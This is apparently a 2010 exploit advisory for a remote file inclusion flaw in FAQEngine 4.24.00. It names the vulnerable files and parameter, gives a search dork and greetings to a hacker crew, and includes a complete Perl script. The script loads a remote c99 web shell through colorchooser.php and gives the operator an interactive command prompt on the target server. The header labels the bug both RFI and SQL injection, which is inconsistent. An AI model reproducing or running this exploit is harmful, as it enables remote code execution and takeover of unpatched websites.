###################################################################################
#                                                                                  #
#[~] FAQEngine 4.24.00 - Remote File Inclusion vulnerability   [ RFI ]             #
#[~] Author	: kaMtiEz (kamzcrew@gmail.com)                                    #
#[~] Homepage	: http://www.indonesiancoder.com                                  #
#[~] Date	: January 6, 2010                                                 #
                                                                                  #
####################################################################################
#
#
#
#[+] Vendor : http://www.boesch-it.de/
#[+] Download : http://www.boesch-it.de/sw/faqengine.php?lang=en
#[+] version : 4.24.00 or lower maybe also affected
#[+] Vulnerability : SQL injection
#[+] Dork : "Think iT"
#[+] Price : -            
#[+] Location : INDONESIA - JOGJA
#
##################################################################################
#
#
#[ HERE WE GO .. LIVE FROM JOGJA CITY ]
#
#[ Vulnerable File ]
#
#http://127.0.0.1/[kaMtiEz]/attachs.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/backup.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/badwords.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/categories.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/changepw.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/colorchooser.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/colorwheel.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/dbfiles.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/diraccess.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/faq.php?path_faqe=[INDONESIANCODER]
#ttp://127.0.0.1/[kaMtiEz]/index.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/kb.php?path_faqe=[INDONESIANCODER]
#http://127.0.0.1/[kaMtiEz]/stats.php?path_faqe=[INDONESIANCODER]
#
#etc etc etc .. too much ..
#
[ ERROR IN ]
#
#require_once($path_faqe."/includes/global.inc.php");
#
#[ FIX ] 
#
#dunno .. :P~~
#
#===========================================================================
#
#[ Thx TO ]
#
#[+] INDONESIAN CODER TEAM KILL-9 CREW KIRIK CREW MainHack ServerIsDown SurabayaHackerLink
#[+] tukulesto,M3NW5,arianom,tiw0L,abah_benu,d0ntcry ..
#[+] Contrex,onthel,yasea,bugs,Ronz,Pathloader,cimpli
#[+] Coracore,Gh4mb4s,Jack-,VycOd,m0rgue a.k.a mbamboenk
#
#[ NOTE ] 
#
#[+] Nyak ama babe gua .. tak lupa adik gua ..
#[+] sendiri dingin sepi ... tanpa sengaja menemukan celah ke 2x nya ..
#[+] Dengerin Radio yach di http://antisecradio.fm manteb2 loh .. :D
#
#[ QUOTE ]
#
#[+] KEEP MOVIN .. !
#[+] INDONESIANCODER still r0x
#
#[ EOF ]
#
#[+] INDONESIANOCODER TEAM
#[+] KILL -9 TEAM 





use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] FAQEngine 4.24.00 Remote File Inclusion Exploit (VI)\n\n";
	print "[x] Author: kaMtiEz\n";
	print "[x] Email: kamzcrew@gmail.com\n";
	print "[x] Website: http://www.indonesiancoder.com \n\n";
	print "[x] Location: INDONESIA - JOGJA\n\n";
	print "[x] Coded by QUAKERDOOMER for WinAutoPWN\n";
	print "[x] http://solidmecca.co.nr\n";
	print "[x] (quakerdoomer [[<<at>>]] fmguy.com)\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.someone.com/test/\" -shell \"http://someone.com/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/colorchooser.php?path_faqe=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

#bd0rk

